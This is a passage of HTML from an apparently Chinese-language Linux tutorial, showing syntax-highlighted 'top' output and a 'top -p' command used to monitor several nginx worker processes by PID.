class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">0.2</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">sy</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">0.0</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ni</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">99.7</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">id</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">0.0</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">wa</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">0.0</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">hi</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">0.0</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">si</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">0.0</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">st</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6700d11b2434668897-4\"> </div><div class=\"crayon-line\" id=\"crayon-5bab6700d11b2434668897-5\"><span class=\"crayon-e\">KiB </span><span class=\"crayon-v\">Mem</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">16387132</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">total</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">10854648</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">free</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">1859036</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">used</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">3673448</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">buff</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">cache</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6700d11b2434668897-6\"><span class=\"crayon-e\">KiB </span><span class=\"crayon-v\">Swap</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">total</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">free</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">used</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">14176540</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">avail </span><span class=\"crayon-i\">Mem</span></div><div class=\"crayon-line\" id=\"crayon-5bab6700d11b2434668897-7\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6700d11b2434668897-8\"> <span class=\"crayon-h\"> </span><span class=\"crayon-e\">PID </span><span class=\"crayon-i\">USER</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-i\">PR</span><span class=\"crayon-h\"> </span> <span class=\"crayon-i\">NI</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-i\">VIRT</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-i\">RES</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-i\">SHR</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">S</span><span class=\"crayon-h\"> </span> <span class=\"crayon-o\">%</span><span class=\"crayon-v\">CPU</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">%</span><span class=\"crayon-i\">MEM</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-v\">TIME</span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">COMMAND</span></div><div class=\"crayon-line\" id=\"crayon-5bab6700d11b2434668897-9\"><span class=\"crayon-cn\">17270</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">alan</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">20</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">3930764</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">247288</span><span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">98992</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">R</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0.7</span><span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">1.5</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">5</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">58.22</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">gnome</span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">shell</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6700d11b2434668897-10\"><span class=\"crayon-cn\">20496</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">alan</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">20</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">816144</span><span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">45416</span><span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">29844</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">S</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0.5</span><span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">0.3</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">22.16</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">gnome</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">terminal</span><span class=\"crayon-o\">-</span></div><div class=\"crayon-line\" id=\"crayon-5bab6700d11b2434668897-11\"><span class=\"crayon-cn\">21110</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">alan</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">20</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">41940</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">3988</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">3188</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">R</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0.1</span><span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">0.0</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00.17</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">top</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6700d11b2434668897-12\"> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">root</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">20</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">225564</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">9416</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">6768</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">S</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0.0</span><span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">0.1</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">10.72</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">systemd</span></div><div class=\"crayon-line\" id=\"crayon-5bab6700d11b2434668897-13\"> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">root</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">20</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">S</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0.0</span><span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">0.0</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00.01</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">kthreadd</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6700d11b2434668897-14\"> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">4</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">root</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">20</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">I</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0.0</span><span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">0.0</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00.00</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">kworker</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">0</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">0H</span></div><div class=\"crayon-line\" id=\"crayon-5bab6700d11b2434668897-15\"> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">6</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">root</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">20</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">I</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0.0</span><span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">0.0</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00.00</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">mm_percpu</span><span class=\"crayon-sy\">_</span>wq</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6700d11b2434668897-16\"> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">7</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">root</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">20</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">S</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0.0</span><span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">0.0</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00.08</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ksoftirqd</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">0</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0189 seconds] -->\r\n<p>可以通过键入字母 <code>s</code> 和您喜欢的更新秒数来更改更新间隔。为了更容易监控我们的示例 Nginx 进程，我们可以使用 <code>-p</code> 选项并传递 PID 来调用 <code>top</code>。这个输出要干净得多。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6700d11b6184872098\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-mixed-highlight\" title=\"含多种语言\"></span><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nalan@workstation:~$ top -p20881 -p20882 -p20895 -p20896\r\n\r\nTasks:   4 total,   0 running,   4 sleeping,   0 stopped,   0 zombie\r\n%Cpu(s):  2.8 us,  1.3 sy,  0.0 ni, 95.9 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st\r\nKiB Mem : 16387132 total, 10856008 free,  1857648 used,  3673476 buff/cache\r\nKiB Swap:        0 total,        0 free,        0 used. 14177928 avail Mem\r\n\r\n  PID USER      PR  NI    VIRT    RES    SHR S  %CPU %MEM     TIME+ COMMAND\r\n20881 alan      20   0   12016    348      0 S   0.0  0.0   0:00.00 nginx\r\n20882 alan      20   0   12460   1644    932 S   0.0  0.0   0:00.00 nginx\r\n20895 alan      20   0   12016    352      0 S   0.0  0.0   0:00.00 nginx\r\n20896 alan      20   0   12460   1628    912 S   0.0  0.0   0:00.00 nginx</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6700d11b6184872098-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6700d11b6184872098-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab6700d11b6184872098-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6700d11b6184872098-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab6700d11b6184872098-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6700d11b6184872098-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5bab6700d11b6184872098-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6700d11b6184872098-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5bab6700d11b6184872098-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6700d11b6184872098-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5bab6700d11b6184872098-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6700d11b6184872098-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5bab6700d11b6184872098-13\">13</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6700d11b6184872098-1\"><span class=\"crayon-v\">alan</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">workstation</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">~</span><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">top</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">p20881</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">p20882</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">p20895</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">p20896</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6700d11b6184872098-2\"> </div><div class=\"crayon-line\" id=\"crayon-5bab6700d11b6184872098-3\"><span class=\"crayon-v\">Tasks</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">4</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">total</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">running</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">4</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">sleeping</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">stopped</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">zombie</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6700d11b6184872098-4\"><span class=\"crayon-ta\">%</span><span class=\"crayon-e\">Cpu</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">s</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">2.8</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">us</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">1.3</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">sy</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">0.0</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ni</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">95.9</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">id</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">0.0</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">wa</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">0.0</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">hi</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">0.0</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">si</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">0.0</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">st</span></div><div class=\"crayon-line\" id=\"crayon-5bab6700d11b6184872098-5\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6700d11b6184872098-6\"><span class=\"crayon-e\">KiB </span><span class=\"crayon-v\">Mem</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">16387132</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">total</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">10856008</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">free</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">1857648</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">used</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">3673476</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">buff</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">cache</span></div><div class=\"crayon-line\" id=\"crayon-5bab6700d11b6184872098-7\"><span class=\"crayon-e\">KiB </span><span class=\"crayon-v\">Swap</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">total</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">free</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">used</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">14177928</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">avail </span><span class=\"crayon-i\">Mem</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6700d11b6184872098-8\"> </div><div class=\"crayon-line\" id=\"crayon-5bab6700d11b6184872098-9\"> <span class=\"crayon-h\"> </span><span class=\"crayon-e\">PID </span><span class=\"crayon-i\">USER</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-i\">PR</span><span class=\"crayon-h\"> </span> <span class=\"crayon-i\">NI</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-i\">VIRT</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-i\">RES</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-i\">SHR</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">S</span><span class=\"crayon-h\"> </span> <span class=\"crayon-o\">%</span><span class=\"crayon-v\">CPU</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">%</span><span class=\"crayon-i\">MEM</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-v\">TIME</span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">COMMAND</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6700d11b6184872098-10\"><span class=\"crayon-cn\">20881</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">alan</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">20</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">12016</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">348</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">S</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0.0</span><span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">0.0</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00.00</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">nginx</span></div><div class=\"crayon-line\" id=\"crayon-5bab6700d11b6184872098-11\"><span class=\"crayon-cn\">20882</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">alan</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">20</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">12460</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1644</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">932</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">S</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0.0</span><span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">0.0</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00.00</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">nginx</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6700d11b6184872098-12\"><span class=\"crayon-cn\">20895</span><span class=\"crayon-h\"> 